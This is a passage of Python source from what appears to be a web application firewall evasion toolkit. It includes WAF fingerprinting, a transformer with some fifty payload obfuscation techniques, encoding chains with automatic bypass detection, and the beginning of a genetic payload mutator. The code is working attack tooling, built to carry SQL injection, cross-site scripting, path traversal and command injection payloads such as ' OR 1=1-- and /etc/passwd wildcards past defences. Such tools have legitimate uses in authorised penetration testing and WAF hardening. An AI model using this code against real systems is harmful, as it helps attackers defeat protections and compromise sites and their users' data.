                "WAF fingerprinted: %s (confidence=%.2f, paranoia=%s)",
                best_waf, best_score, paranoia.name,
            )
            self._history.append(profile)
            return profile

    def _estimate_paranoia(
        self,
        status_code: int,
        body: str,
        headers: Dict[str, str],
    ) -> ParanoiaLevel:
        """Estimate WAF paranoia level from response characteristics."""
        indicators = 0
        # 406 or 501 = more aggressive blocking
        if status_code in (406, 501):
            indicators += 2
        elif status_code == 403:
            indicators += 1
        # Multiple blocked keywords in body
        body_lower = body.lower()
        block_words = ["blocked", "denied", "rejected", "forbidden",
                       "violation", "attack", "malicious"]
        for w in block_words:
            if w in body_lower:
                indicators += 1
        # Security headers presence
        sec_headers = ["x-content-type-options", "x-frame-options",
                       "strict-transport-security", "content-security-policy"]
        for sh in sec_headers:
            if sh in {k.lower() for k in headers}:
                indicators += 1

        if indicators >= 6:
            return ParanoiaLevel.EXTREME
        elif indicators >= 4:
            return ParanoiaLevel.HIGH
        elif indicators >= 2:
            return ParanoiaLevel.MEDIUM
        return ParanoiaLevel.LOW

    def _extract_blocked_patterns(self, body: str) -> List[str]:
        """Extract clues about what patterns the WAF blocks from response."""
        patterns_found: List[str] = []
        body_lower = body.lower()
        checks = {
            "sql_injection": ["sql", "injection", "query", "select", "union"],
            "xss": ["xss", "script", "cross-site", "javascript"],
            "traversal": ["traversal", "directory", "path", "lfi"],
            "rce": ["command", "execution", "rce", "shell"],
            "file_upload": ["upload", "file", "extension"],
            "protocol": ["protocol", "http", "request"],
        }
        for category, keywords in checks.items():
            for kw in keywords:
                if kw in body_lower:
                    patterns_found.append(category)
                    break
        return list(set(patterns_found))

    def _estimate_encoding_support(self, waf_name: str) -> List[str]:
        """Estimate which encodings a WAF can decode/normalize."""
        base = ["url_single", "html_basic"]
        advanced = {
            "cloudflare": ["url_double", "unicode", "utf8_overlong", "base64"],
            "imperva": ["url_double", "unicode", "html_full", "base64"],
            "akamai": ["url_double", "unicode", "html_full"],
            "aws_waf": ["url_double", "unicode"],
            "modsecurity": ["url_double", "unicode", "html_full", "base64", "utf8_overlong"],
            "f5_big_ip": ["url_double", "unicode", "html_full"],
            "sucuri": ["url_double", "unicode"],
            "barracuda": ["url_double"],
            "fortinet": ["url_double", "unicode"],
            "wordfence": ["url_double"],
            "wallarm": ["url_double", "unicode", "base64"],
            "denyall": ["url_double"],
        }
        return base + advanced.get(waf_name, [])

    def get_history(self) -> List[Dict[str, Any]]:
        """Return fingerprinting history."""
        with self._lock:
            return [p.to_dict() for p in self._history]


# ════════════════════════════════════════════════════════════════════════════════
# PAYLOAD TRANSFORMER — 50+ real transformation techniques
# ════════════════════════════════════════════════════════════════════════════════

class PayloadTransformer:
    """
    Applies 50+ transformation techniques to payloads to evade WAF detection.

    Each transformation implements real encoding/obfuscation logic.

    Usage::

        pt = PayloadTransformer()
        result = pt.transform("' OR 1=1--", TransformType.DOUBLE_URL_ENCODE)
        # "%2527%2520OR%25201%253D1--"
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._transform_map: Dict[TransformType, Callable[[str], str]] = {
            TransformType.URL_ENCODE: self._url_encode,
            TransformType.DOUBLE_URL_ENCODE: self._double_url_encode,
            TransformType.TRIPLE_URL_ENCODE: self._triple_url_encode,
            TransformType.OVERLONG_UTF8: self._overlong_utf8,
            TransformType.UNICODE_NORMALIZE: self._unicode_normalize,
            TransformType.CASE_ALTERNATE: self._case_alternate,
            TransformType.CASE_UPPER: self._case_upper,
            TransformType.CASE_RANDOM: self._case_random,
            TransformType.COMMENT_INLINE: self._comment_inline,
            TransformType.COMMENT_MYSQL: self._comment_mysql,
            TransformType.COMMENT_NESTED: self._comment_nested,
            TransformType.WHITESPACE_TAB: self._whitespace_tab,
            TransformType.WHITESPACE_NEWLINE: self._whitespace_newline,
            TransformType.WHITESPACE_CR: self._whitespace_cr,
            TransformType.WHITESPACE_VTAB: self._whitespace_vtab,
            TransformType.WHITESPACE_COMMENT: self._whitespace_comment,
            TransformType.CONCAT_SQL: self._concat_sql,
            TransformType.CONCAT_JS: self._concat_js,
            TransformType.CONCAT_PHP: self._concat_php,
            TransformType.NUMERIC_HEX: self._numeric_hex,
            TransformType.NUMERIC_BINARY: self._numeric_binary,
            TransformType.NUMERIC_SCIENTIFIC: self._numeric_scientific,
            TransformType.NUMERIC_CHAR: self._numeric_char,
            TransformType.HTML_DECIMAL: self._html_decimal,
            TransformType.HTML_HEX: self._html_hex,
            TransformType.HTML_NAMED: self._html_named,
            TransformType.HTML_NULL_BYTE: self._html_null_byte,
            TransformType.NULL_BYTE_PREFIX: self._null_byte_prefix,
            TransformType.NULL_BYTE_EXTENSION: self._null_byte_extension,
            TransformType.HPP_DUPLICATE: self._hpp_duplicate,
            TransformType.HPP_ARRAY: self._hpp_array,
            TransformType.CONTENT_TYPE_JSON: self._content_type_json,
            TransformType.CONTENT_TYPE_MULTIPART: self._content_type_multipart,
            TransformType.CONTENT_TYPE_XML: self._content_type_xml,
            TransformType.BASE64_ENCODE: self._base64_encode,
            TransformType.ROT13: self._rot13,
            TransformType.UNICODE_ESCAPE: self._unicode_escape,
            TransformType.HEX_ENCODE: self._hex_encode,
            TransformType.OCTAL_ENCODE: self._octal_encode,
            TransformType.DOUBLE_SLASH: self._double_slash,
            TransformType.PATH_TRAVERSAL_BYPASS: self._path_traversal_bypass,
            TransformType.HEADER_INJECTION: self._header_injection,
            TransformType.CHUNKED_ENCODING: self._chunked_encoding,
            TransformType.WILDCARD_BYPASS: self._wildcard_bypass,
            TransformType.JSON_UNICODE_ESCAPE: self._json_unicode_escape,
            TransformType.CDATA_WRAP: self._cdata_wrap,
            TransformType.BACKTICK_WRAP: self._backtick_wrap,
            TransformType.PARENTHESIS_WRAP: self._parenthesis_wrap,
            TransformType.MULTILINE_BREAK: self._multiline_break,
            TransformType.CHARSET_MIX: self._charset_mix,
            TransformType.BOUNDARY_EMOJI: self._boundary_emoji,
            TransformType.TAB_INLINE: self._tab_inline,
            TransformType.SEMICOLON_TERMINATE: self._semicolon_terminate,
        }
        self._stats: Dict[str, int] = defaultdict(int)
        logger.info("PayloadTransformer initialized with %d techniques",
                     len(self._transform_map))

    def transform(self, payload: str, technique: TransformType) -> str:
        """Apply a single transformation technique to a payload."""
        with self._lock:
            func = self._transform_map.get(technique)
            if func is None:
                logger.warning("Unknown transform type: %s", technique)
                return payload
            try:
                result = func(payload)
                self._stats[technique.name] += 1
                return result
            except Exception as exc:
                logger.error("Transform %s failed: %s", technique.name, exc)
                return payload

    def transform_chain(
        self, payload: str, techniques: List[TransformType]
    ) -> str:
        """Apply a chain of transformations in sequence."""
        result = payload
        for tech in techniques:
            result = self.transform(result, tech)
        return result

    def get_all_transforms(self) -> List[TransformType]:
        """Return all available transform types."""
        return list(self._transform_map.keys())

    def get_stats(self) -> Dict[str, int]:
        """Return usage statistics."""
        with self._lock:
            return dict(self._stats)

    # ── URL Encoding Variants ──────────────────────────────────────────────

    def _url_encode(self, payload: str) -> str:
        """Single URL encode special characters."""
        result: List[str] = []
        for ch in payload:
            if ch.isalnum() or ch in "-_.~":
                result.append(ch)
            else:
                result.append(f"%{ord(ch):02X}")
        return "".join(result)

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode: encode the percent signs from first encoding."""
        single = self._url_encode(payload)
        result: List[str] = []
        i = 0
        while i < len(single):
            if single[i] == "%" and i + 2 < len(single):
                hex_part = single[i + 1: i + 3]
                result.append(f"%25{hex_part}")
                i += 3
            else:
                result.append(single[i])
                i += 1
        return "".join(result)

    def _triple_url_encode(self, payload: str) -> str:
        """Triple URL encode."""
        single = self._url_encode(payload)
        # Double encode the percent signs
        double: List[str] = []
        i = 0
        while i < len(single):
            if single[i] == "%" and i + 2 < len(single):
                hex_part = single[i + 1: i + 3]
                double.append(f"%25{hex_part}")
                i += 3
            else:
                double.append(single[i])
                i += 1
        double_str = "".join(double)
        # Triple: encode percent signs from double
        triple: List[str] = []
        i = 0
        while i < len(double_str):
            if double_str[i] == "%" and i + 2 < len(double_str):
                hex_part = double_str[i + 1: i + 3]
                triple.append(f"%25{hex_part}")
                i += 3
            else:
                triple.append(double_str[i])
                i += 1
        return "".join(triple)

    def _overlong_utf8(self, payload: str) -> str:
        """Replace special chars with overlong UTF-8 sequences."""
        result: List[str] = []
        for ch in payload:
            if ch in OVERLONG_UTF8_MAP:
                result.append(OVERLONG_UTF8_MAP[ch])
            else:
                result.append(ch)
        return "".join(result)

    def _unicode_normalize(self, payload: str) -> str:
        """Replace characters with Unicode escape sequences (\\uXXXX)."""
        result: List[str] = []
        for ch in payload:
            if ch in UNICODE_ESCAPE_MAP:
                result.append(UNICODE_ESCAPE_MAP[ch])
            elif not ch.isalnum():
                result.append(f"\\u{ord(ch):04x}")
            else:
                result.append(ch)
        return "".join(result)

    # ── Case Manipulation ──────────────────────────────────────────────────

    def _case_alternate(self, payload: str) -> str:
        """Alternating case: sElEcT."""
        result: List[str] = []
        alpha_idx = 0
        for ch in payload:
            if ch.isalpha():
                result.append(ch.lower() if alpha_idx % 2 == 0 else ch.upper())
                alpha_idx += 1
            else:
                result.append(ch)
        return "".join(result)

    def _case_upper(self, payload: str) -> str:
        """Full uppercase transformation."""
        return payload.upper()

    def _case_random(self, payload: str) -> str:
        """Random case for each alphabetic character."""
        result: List[str] = []
        for ch in payload:
            if ch.isalpha():
                result.append(ch.upper() if random.random() > 0.5 else ch.lower())
            else:
                result.append(ch)
        return "".join(result)

    # ── Comment Injection (SQL) ────────────────────────────────────────────

    def _comment_inline(self, payload: str) -> str:
        """Insert inline comments into SQL keywords: SEL/**/ECT."""
        result = payload
        for kw in SQL_KEYWORDS:
            if len(kw) < 3:
                continue
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def _split_keyword(m: re.Match) -> str:
                word = m.group(0)
                mid = len(word) // 2
                return word[:mid] + "/**/" + word[mid:]
            result = pattern.sub(_split_keyword, result)
        return result

    def _comment_mysql(self, payload: str) -> str:
        """MySQL versioned comment bypass: /*!50000SELECT*/."""
        result = payload
        for kw in SQL_KEYWORDS:
            if len(kw) < 3:
                continue
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            def _version_wrap(m: re.Match, keyword: str = kw) -> str:
                return f"/*!50000{m.group(0).upper()}*/"
            result = pattern.sub(_version_wrap, result)
        return result

    def _comment_nested(self, payload: str) -> str:
        """Nested comment splitting: SE/*foo*/LE/*bar*/CT."""
        result = payload
        comment_fillers = ["foo", "bar", "baz", "x", "y", "z", "!", ""]
        for kw in SQL_KEYWORDS:
            if len(kw) < 4:
                continue
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def _nested_split(m: re.Match) -> str:
                word = m.group(0)
                parts: List[str] = []
                chunk_size = max(1, len(word) // 3)
                idx = 0
                filler_idx = 0
                while idx < len(word):
                    end = min(idx + chunk_size, len(word))
                    parts.append(word[idx:end])
                    idx = end
                    filler_idx += 1
                filler_comments = []
                for i, part in enumerate(parts):
                    filler_comments.append(part)
                    if i < len(parts) - 1:
                        fi = comment_fillers[i % len(comment_fillers)]
                        filler_comments.append(f"/*{fi}*/")
                return "".join(filler_comments)
            result = pattern.sub(_nested_split, result)
        return result

    # ── Whitespace Alternatives ────────────────────────────────────────────

    def _whitespace_tab(self, payload: str) -> str:
        """Replace spaces with tab characters (%09)."""
        return payload.replace(" ", "\t")

    def _whitespace_newline(self, payload: str) -> str:
        """Replace spaces with newline characters (%0a)."""
        return payload.replace(" ", "\n")

    def _whitespace_cr(self, payload: str) -> str:
        """Replace spaces with carriage return (%0d)."""
        return payload.replace(" ", "\r")

    def _whitespace_vtab(self, payload: str) -> str:
        """Replace spaces with vertical tab (%0b)."""
        return payload.replace(" ", "\x0b")

    def _whitespace_comment(self, payload: str) -> str:
        """Replace spaces with SQL comment /**/ as space equivalent."""
        return payload.replace(" ", "/**/")

    # ── String Concatenation ───────────────────────────────────────────────

    def _concat_sql(self, payload: str) -> str:
        """SQL string concatenation: CONCAT('sel','ect') or 'sel'||'ect'."""
        result = payload
        for kw in SQL_KEYWORDS:
            if len(kw) < 4:
                continue
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            def _sql_concat(m: re.Match) -> str:
                word = m.group(0)
                mid = len(word) // 2
                return f"CONCAT('{word[:mid]}','{word[mid:]}')"
            result = pattern.sub(_sql_concat, result)
        return result

    def _concat_js(self, payload: str) -> str:
        """JavaScript string concatenation: 'al'+'ert'."""
        js_funcs = ["alert", "prompt", "confirm", "eval", "setTimeout",
                     "setInterval", "document", "window", "String",
                     "fromCharCode", "innerHTML", "outerHTML"]
        result = payload
        for func in js_funcs:
            pattern = re.compile(re.escape(func), re.IGNORECASE)
            def _js_split(m: re.Match) -> str:
                word = m.group(0)
                mid = len(word) // 2
                return f"'{word[:mid]}'+'{ word[mid:]}'"
            result = pattern.sub(_js_split, result)
        return result

    def _concat_php(self, payload: str) -> str:
        """PHP string concatenation: 'ev'.'al'."""
        php_funcs = ["eval", "exec", "system", "passthru", "shell_exec",
                      "popen", "proc_open", "assert", "preg_replace",
                      "include", "require", "file_get_contents"]
        result = payload
        for func in php_funcs:
            pattern = re.compile(re.escape(func), re.IGNORECASE)
            def _php_concat(m: re.Match) -> str:
                word = m.group(0)
                mid = len(word) // 2
                return f"'{word[:mid]}'.'{word[mid:]}'"
            result = pattern.sub(_php_concat, result)
        return result

    # ── Numeric Alternatives ───────────────────────────────────────────────

    def _numeric_hex(self, payload: str) -> str:
        """Convert string literals to hex representation: 0x41444D494E."""
        def _to_hex(m: re.Match) -> str:
            word = m.group(1)
            hex_str = "".join(f"{ord(c):02X}" for c in word)
            return f"0x{hex_str}"
        # Match quoted strings
        result = re.sub(r"'([^']+)'", _to_hex, payload)
        return result

    def _numeric_binary(self, payload: str) -> str:
        """Convert string literals to binary representation."""
        def _to_bin(m: re.Match) -> str:
            word = m.group(1)
            bin_str = "".join(f"{ord(c):08b}" for c in word)
            return f"0b{bin_str}"
        result = re.sub(r"'([^']+)'", _to_bin, payload)
        return result

    def _numeric_scientific(self, payload: str) -> str:
        """Insert scientific notation to break pattern: 1e0UNION."""
        result = payload
        for kw in ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]:
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            def _sci_prefix(m: re.Match) -> str:
                return f"1e0{m.group(0)}"
            result = pattern.sub(_sci_prefix, result)
        return result

    def _numeric_char(self, payload: str) -> str:
        """Convert string to CHAR() function: CHAR(83,69,76,69,67,84)."""
        def _to_char(m: re.Match) -> str:
            word = m.group(1)
            char_vals = ",".join(str(ord(c)) for c in word)
            return f"CHAR({char_vals})"
        result = re.sub(r"'([^']+)'", _to_char, payload)
        return result

    # ── HTML Encoding ──────────────────────────────────────────────────────

    def _html_decimal(self, payload: str) -> str:
        """HTML decimal encoding: &#60;script&#62;."""
        result: List[str] = []
        for ch in payload:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"&#{ord(ch)};")
        return "".join(result)

    def _html_hex(self, payload: str) -> str:
        """HTML hex encoding: &#x3c;script&#x3e;."""
        result: List[str] = []
        for ch in payload:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"&#x{ord(ch):x};")
        return "".join(result)

    def _html_named(self, payload: str) -> str:
        """HTML named entity encoding for known characters."""
        result: List[str] = []
        for ch in payload:
            if ch in HTML_NAMED_MAP:
                result.append(HTML_NAMED_MAP[ch])
            else:
                result.append(ch)
        return "".join(result)

    def _html_null_byte(self, payload: str) -> str:
        """Insert null bytes within HTML tags: <scr%00ipt>."""
        tag_pattern = re.compile(r'<(/?\w+)')
        def _insert_null(m: re.Match) -> str:
            tag = m.group(0)
            tag_name = m.group(1)
            if len(tag_name) > 2:
                mid = len(tag_name) // 2
                broken = tag_name[:mid] + "%00" + tag_name[mid:]
                return tag[0] + broken
            return tag
        return tag_pattern.sub(_insert_null, payload)

    # ── Null Byte Injection ────────────────────────────────────────────────

    def _null_byte_prefix(self, payload: str) -> str:
        """Prepend null byte before payload."""
        return "%00" + payload

    def _null_byte_extension(self, payload: str) -> str:
        """Insert null byte for extension bypass: file.php%00.jpg."""
        ext_pattern = re.compile(r'(\.\w+)$')
        match = ext_pattern.search(payload)
        if match:
            pos = match.start()
            return payload[:pos] + payload[pos:] + "%00.jpg"
        return payload + "%00"

    # ── HTTP Parameter Pollution ───────────────────────────────────────────

    def _hpp_duplicate(self, payload: str) -> str:
        """HPP via duplicate parameters: param=safe&param=payload."""
        # Detect if payload contains = for param format
        if "=" in payload:
            parts = payload.split("=", 1)
            param_name = parts[0]
            param_value = parts[1] if len(parts) > 1 else ""
            # Split value around keywords
            for kw in ["UNION", "SELECT", "OR", "AND"]:
                kw_pattern = re.compile(re.escape(kw), re.IGNORECASE)
                kw_match = kw_pattern.search(param_value)
                if kw_match:
                    before = param_value[:kw_match.start()].strip()
                    after = param_value[kw_match.start():].strip()
                    return f"{param_name}={before}&{param_name}={after}"
            return f"{param_name}=1&{param_name}={param_value}"
        return f"id=1&id={payload}"

    def _hpp_array(self, payload: str) -> str:
        """HPP via array notation: param[]=payload."""
        if "=" in payload:
            parts = payload.split("=", 1)
            param_name = parts[0]
            param_value = parts[1] if len(parts) > 1 else ""
            return f"{param_name}[]={param_value}"
        return f"id[]={payload}"

    # ── Content-Type Switching ─────────────────────────────────────────────

    def _content_type_json(self, payload: str) -> str:
        """Wrap payload in JSON format for Content-Type switching."""
        escaped = payload.replace("\\", "\\\\").replace('"', '\\"')
        return json.dumps({"input": escaped})

    def _content_type_multipart(self, payload: str) -> str:
        """Wrap payload in multipart/form-data format."""
        boundary = uuid.uuid4().hex[:16]
        parts = [
            f"--{boundary}",
            'Content-Disposition: form-data; name="input"',
            "",
            payload,
            f"--{boundary}--",
        ]
        return "\r\n".join(parts)

    def _content_type_xml(self, payload: str) -> str:
        """Wrap payload in XML format."""
        escaped = (payload
                   .replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace('"', "&quot;"))
        return f'<?xml version="1.0"?><root><input>{escaped}</input></root>'

    # ── Additional Encodings ───────────────────────────────────────────────

    def _base64_encode(self, payload: str) -> str:
        """Base64 encode the payload."""
        return base64.b64encode(payload.encode("utf-8")).decode("ascii")

    def _rot13(self, payload: str) -> str:
        """ROT13 encoding."""
        return codecs.encode(payload, "rot_13")

    def _unicode_escape(self, payload: str) -> str:
        """Full Unicode escape for all non-alnum characters."""
        result: List[str] = []
        for ch in payload:
            if ch in UNICODE_ESCAPE_MAP:
                result.append(UNICODE_ESCAPE_MAP[ch])
            elif not ch.isalnum():
                result.append(f"\\u{ord(ch):04x}")
            else:
                result.append(ch)
        return "".join(result)

    def _hex_encode(self, payload: str) -> str:
        """Hex encode each character: \\x27 style."""
        result: List[str] = []
        for ch in payload:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"\\x{ord(ch):02x}")
        return "".join(result)

    def _octal_encode(self, payload: str) -> str:
        """Octal encode each non-alnum character: \\047 style."""
        result: List[str] = []
        for ch in payload:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"\\{ord(ch):03o}")
        return "".join(result)

    def _double_slash(self, payload: str) -> str:
        """Double slash for path bypass: //etc//passwd."""
        return payload.replace("/", "//")

    def _path_traversal_bypass(self, payload: str) -> str:
        """Path traversal with encoded dots and slashes."""
        replacements = [
            ("../", "..;/"),
            ("..\\", "..;\\"),
        ]
        result = payload
        for old, new in replacements:
            result = result.replace(old, new)
        # Also try URL-encoded dots
        result = result.replace("..", "%2e%2e")
        return result

    def _header_injection(self, payload: str) -> str:
        """Add CRLF header injection prefix."""
        return f"%0d%0aX-Injected: true%0d%0a{payload}"

    def _chunked_encoding(self, payload: str) -> str:
        """Simulate chunked transfer encoding of payload."""
        chunks: List[str] = []
        chunk_size = max(1, len(payload) // 4)
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i + chunk_size]
            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")
        return "".join(chunks)

    def _wildcard_bypass(self, payload: str) -> str:
        """Use wildcards for command injection bypass: /???/??t /???/p??s??."""
        cmd_map = {
            "/bin/cat": "/???/??t",
            "/bin/ls": "/???/??",
            "/etc/passwd": "/???/p??s??",
            "/bin/sh": "/???/??",
            "/bin/bash": "/???/????",
            "cat": "/???/??t",
            "ls": "/???/??",
        }
        result = payload
        for cmd, wildcard in cmd_map.items():
            result = result.replace(cmd, wildcard)
        return result

    def _json_unicode_escape(self, payload: str) -> str:
        """JSON-style Unicode escapes for all characters."""
        result: List[str] = []
        for ch in payload:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"\\u{ord(ch):04x}")
        return "".join(result)

    def _cdata_wrap(self, payload: str) -> str:
        """Wrap payload in XML CDATA section."""
        return f"<![CDATA[{payload}]]>"

    def _backtick_wrap(self, payload: str) -> str:
        """Wrap SQL keywords with backticks."""
        result = payload
        for kw in SQL_KEYWORDS:
            if len(kw) < 2:
                continue
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            def _wrap_bt(m: re.Match) -> str:
                return f"`{m.group(0)}`"
            result = pattern.sub(_wrap_bt, result)
        return result

    def _parenthesis_wrap(self, payload: str) -> str:
        """Wrap SQL keywords with parentheses: (SELECT)."""
        result = payload
        for kw in SQL_KEYWORDS:
            if len(kw) < 3:
                continue
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            def _wrap_paren(m: re.Match) -> str:
                return f"({m.group(0)})"
            result = pattern.sub(_wrap_paren, result)
        return result

    def _multiline_break(self, payload: str) -> str:
        """Break payload across multiple lines."""
        result: List[str] = []
        for i, ch in enumerate(payload):
            result.append(ch)
            if ch == " " and i % 3 == 0:
                result.append("\r\n")
        return "".join(result)

    def _charset_mix(self, payload: str) -> str:
        """Mix Latin and Unicode fullwidth characters."""
        fullwidth_offset = 0xFEE0  # offset from ASCII to fullwidth
        result: List[str] = []
        for i, ch in enumerate(payload):
            if ch.isalpha() and i % 3 == 0:
                code = ord(ch)
                if 0x21 <= code <= 0x7E:
                    result.append(chr(code + fullwidth_offset))
                else:
                    result.append(ch)
            else:
                result.append(ch)
        return "".join(result)

    def _boundary_emoji(self, payload: str) -> str:
        """Insert zero-width characters at word boundaries."""
        zwsp = "\u200b"  # zero-width space
        zwnj = "\u200c"  # zero-width non-joiner
        result: List[str] = []
        for i, ch in enumerate(payload):
            result.append(ch)
            if ch == " ":
                result.append(zwsp)
            elif ch.isalpha() and i > 0 and not payload[i - 1].isalpha():
                result.append(zwnj)
        return "".join(result)

    def _tab_inline(self, payload: str) -> str:
        """Insert tabs between characters in keywords."""
        result = payload
        for kw in SQL_KEYWORDS:
            if len(kw) < 3:
                continue
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def _add_tabs(m: re.Match) -> str:
                word = m.group(0)
                return "\t".join(word)
            result = pattern.sub(_add_tabs, result)
        return result

    def _semicolon_terminate(self, payload: str) -> str:
        """Add semicolon statement termination tricks."""
        return f";{payload};"


# ════════════════════════════════════════════════════════════════════════════════
# ENCODING CHAINER
# ════════════════════════════════════════════════════════════════════════════════

class EncodingChainer:
    """
    Chain multiple encoding techniques in sequence with auto-detection.

    Predefined chains:
      - URL -> Base64 -> URL
      - HTML -> URL -> Unicode
      - ROT13 -> Base64
      - Custom chain builder

    Usage::

        chainer = EncodingChainer()
        result = chainer.chain(
            "' OR 1=1--",
            [TransformType.URL_ENCODE, TransformType.BASE64_ENCODE, TransformType.URL_ENCODE]
        )
    """

    # Predefined chains
    CHAIN_URL_B64_URL = [
        TransformType.URL_ENCODE,
        TransformType.BASE64_ENCODE,
        TransformType.URL_ENCODE,
    ]
    CHAIN_HTML_URL_UNICODE = [
        TransformType.HTML_DECIMAL,
        TransformType.URL_ENCODE,
        TransformType.UNICODE_ESCAPE,
    ]
    CHAIN_ROT13_B64 = [
        TransformType.ROT13,
        TransformType.BASE64_ENCODE,
    ]
    CHAIN_CASE_COMMENT_URL = [
        TransformType.CASE_ALTERNATE,
        TransformType.COMMENT_INLINE,
        TransformType.URL_ENCODE,
    ]
    CHAIN_OVERLONG_DOUBLE = [
        TransformType.OVERLONG_UTF8,
        TransformType.DOUBLE_URL_ENCODE,
    ]
    CHAIN_COMMENT_WHITESPACE_ENCODE = [
        TransformType.COMMENT_MYSQL,
        TransformType.WHITESPACE_TAB,
        TransformType.URL_ENCODE,
    ]
    CHAIN_HEX_B64 = [
        TransformType.HEX_ENCODE,
        TransformType.BASE64_ENCODE,
    ]
    CHAIN_CONCAT_CASE_ENCODE = [
        TransformType.CONCAT_SQL,
        TransformType.CASE_RANDOM,
        TransformType.URL_ENCODE,
    ]

    PREDEFINED_CHAINS: Dict[str, List[TransformType]] = {
        "url_b64_url": CHAIN_URL_B64_URL,
        "html_url_unicode": CHAIN_HTML_URL_UNICODE,
        "rot13_b64": CHAIN_ROT13_B64,
        "case_comment_url": CHAIN_CASE_COMMENT_URL,
        "overlong_double": CHAIN_OVERLONG_DOUBLE,
        "comment_ws_encode": CHAIN_COMMENT_WHITESPACE_ENCODE,
        "hex_b64": CHAIN_HEX_B64,
        "concat_case_encode": CHAIN_CONCAT_CASE_ENCODE,
    }

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._transformer = PayloadTransformer()
        self._chain_results: List[Dict[str, Any]] = []
        logger.info("EncodingChainer initialized with %d predefined chains",
                     len(self.PREDEFINED_CHAINS))

    def chain(
        self, payload: str, chain: List[TransformType]
    ) -> str:
        """Apply a chain of encodings in sequence."""
        with self._lock:
            if len(chain) > MAX_CHAIN_DEPTH:
                logger.warning(
                    "Chain depth %d exceeds max %d, truncating",
                    len(chain), MAX_CHAIN_DEPTH,
                )
                chain = chain[:MAX_CHAIN_DEPTH]

            result = payload
            applied: List[str] = []
            for tech in chain:
                prev = result
                result = self._transformer.transform(result, tech)
                applied.append(tech.name)
                logger.debug("Chain step %s: %d -> %d chars",
                             tech.name, len(prev), len(result))

            self._chain_results.append({
                "original": payload,
                "result": result,
                "chain": applied,
                "original_length": len(payload),
                "result_length": len(result),
                "timestamp": time.time(),
            })
            return result

    def chain_by_name(self, payload: str, chain_name: str) -> str:
        """Apply a predefined chain by name."""
        chain = self.PREDEFINED_CHAINS.get(chain_name)
        if chain is None:
            logger.warning("Unknown chain: %s", chain_name)
            return payload
        return self.chain(payload, chain)

    def try_all_chains(self, payload: str) -> Dict[str, str]:
        """Try all predefined chains and return results."""
        results: Dict[str, str] = {}
        for name, chain in self.PREDEFINED_CHAINS.items():
            results[name] = self.chain(payload, chain)
        return results

    def build_custom_chain(
        self, transforms: List[TransformType]
    ) -> List[TransformType]:
        """Validate and return a custom chain."""
        valid = []
        all_types = set(TransformType)
        for t in transforms:
            if t in all_types:
                valid.append(t)
            else:
                logger.warning("Invalid transform in chain: %s", t)
        return valid

    def get_chain_history(self) -> List[Dict[str, Any]]:
        """Return chain application history."""
        with self._lock:
            return list(self._chain_results)

    def get_predefined_chain_names(self) -> List[str]:
        """Return names of all predefined chains."""
        return list(self.PREDEFINED_CHAINS.keys())

    def auto_detect_best_chain(
        self,
        payload: str,
        test_func: Optional[Callable[[str], bool]] = None,
    ) -> Optional[Tuple[str, str]]:
        """
        Try all predefined chains and use test_func to detect which works.

        Args:
            payload: Original payload to transform.
            test_func: Callable that returns True if the transformed payload
                       bypassed the WAF (e.g., by checking response code).

        Returns:
            Tuple of (chain_name, transformed_payload) or None if none work.
        """
        with self._lock:
            if test_func is None:
                # Without a test function, just return the most complex chain
                name = "overlong_double"
                return (name, self.chain_by_name(payload, name))

            for name, chain_def in self.PREDEFINED_CHAINS.items():
                transformed = self.chain(payload, chain_def)
                try:
                    if test_func(transformed):
                        logger.info("Auto-detect: chain '%s' bypassed WAF", name)
                        return (name, transformed)
                except Exception as exc:
                    logger.warning("Auto-detect test failed for chain '%s': %s",
                                   name, exc)
            return None


# ════════════════════════════════════════════════════════════════════════════════
# PAYLOAD MUTATOR — Genetic mutation of payloads
# ════════════════════════════════════════════════════════════════════════════════

class PayloadMutator:
    """
    Genetic mutation engine for evolving payloads to bypass WAFs.

    Mutation operators:
      - Random encoding application
      - Keyword synonym replacement
      - Whitespace insertion/removal
      - Comment insertion at random positions
      - Wrapper addition (parentheses, backticks)
      - Charset mixing (latin + unicode + emoji boundaries)
      - Crossover between two payloads
      - Selection by fitness

    Usage::

        mutator = PayloadMutator()
        evolved = mutator.evolve("' OR 1=1--", generations=10, population_size=20)
        for payload in evolved:
            print(payload)
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._transformer = PayloadTransformer()
        self._mutation_history: List[Dict[str, Any]] = []
        self._rng = random.Random(int(time.time()))
        logger.info("PayloadMutator initialized")

    def mutate(self, payload: str) -> str:
        """Apply a single random mutation to a payload."""
        mutation_ops = [
            self._mutate_random_encode,
            self._mutate_keyword_synonym,
            self._mutate_whitespace_insert,
            self._mutate_whitespace_remove,
            self._mutate_comment_insert,
            self._mutate_wrapper_add,
            self._mutate_charset_mix,
            self._mutate_case_flip,
            self._mutate_char_substitute,
            self._mutate_null_inject,
            self._mutate_duplicate_segment,
            self._mutate_reverse_segment,
        ]
        op = self._rng.choice(mutation_ops)
        try:
            return op(payload)
        except Exception:
            return payload

    def crossover(self, parent1: str, parent2: str) -> Tuple[str, str]:
        """Single-point crossover between two payloads."""
        if len(parent1) < 2 or len(parent2) < 2:
            return parent1, parent2
        point1 = self._rng.randint(1, len(parent1) - 1)
        point2 = self._rng.randint(1, len(parent2) - 1)
        child1 = parent1[:point1] + parent2[point2:]
        child2 = parent2[:point2] + parent1[point1:]
        return child1, child2

    def evolve(
        self,
        payload: str,
